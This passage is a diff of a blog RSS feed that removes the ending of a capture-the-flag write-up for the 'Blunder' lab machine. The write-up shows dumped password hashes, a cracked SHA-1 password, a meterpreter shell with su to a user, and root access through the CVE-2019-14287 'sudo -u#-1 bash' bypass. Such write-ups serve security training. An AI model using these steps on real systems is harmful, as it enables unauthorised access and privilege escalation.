-        &quot;nickname&quot;: &quot;Hugo&quot;,
-        &quot;firstName&quot;: &quot;Hugo&quot;,
-        &quot;lastName&quot;: &quot;&quot;,
-        &quot;role&quot;: &quot;User&quot;,
-        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
-        &quot;email&quot;: &quot;&quot;,
-        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
-        &quot;tokenRemember&quot;: &quot;&quot;,
-        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
-        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
-        ...
-}</code></pre><p>So, we now have the following credentials:</p><!--kg-card-begin: markdown--><table>
-<thead>
-<tr>
-<th>username</th>
-<th>hash</th>
-<th>salt</th>
-<th>password</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>fergus</td>
-<td>bfcc887f62e36ea019e3295aafb8a3885966e265</td>
-<td>5dde2887e7aca</td>
-<td>RolandDeschain</td>
-</tr>
-<tr>
-<td>admin</td>
-<td>be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7</td>
-<td>jqxpjfnv</td>
-<td></td>
-</tr>
-<tr>
-<td>admin (hugo)</td>
-<td>faca404fd5c0a31cf1897b823c695c85cffeb98d</td>
-<td></td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<!--kg-card-end: markdown--><p>This last user is particularly interesting because <code>hugo</code> is one of the users that have a directory on the <code>home</code> dir:</p><pre><code>Listing: /home
-==============
-
-Mode             Size  Type  Last modified              Name
-----             ----  ----  -------------              ----
-40755/rwxr-xr-x  4096  dir   2020-05-26 09:29:29 +0100  hugo
-40755/rwxr-xr-x  4096  dir   2020-04-28 12:13:35 +0100  shaun</code></pre><p>After some googling, I realised hugo&apos;s password is just a non-salted <code>SHA-1</code> hash for <code>Password120</code>. Let&apos;s authenticate as <code>hugo</code>:</p><pre><code>meterpreter &gt; shell
-Process 32464 created.
-Channel 10 created.
-su - hugo
-Password: Password120
-
-cat user.txt
-c0c23698b18cc480ebd74fd6570281ef</code></pre><hr><h2 id="getting-root">Getting root</h2><p>This is one of those instances of starting with the <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">low-hanging fruit:</a></p><pre><code>hugo@blunder:~$ sudo -u#-1 bash
-sudo -u#-1 bash
-Password: Password120
-
-root@blunder:/home/hugo# cat /root/root.txt
-cat /root/root.txt
-6ffe09ebd667f8eb04c6c65b6260e6ce
-root@blunder:/home/hugo#</code></pre><p>That&apos;s it! Hope you enjoyed it!</p>]]></content:encoded></item></channel></rss>
+<!--kg-card-end: markdown--><hr>]]></content:encoded></item></channel></rss>
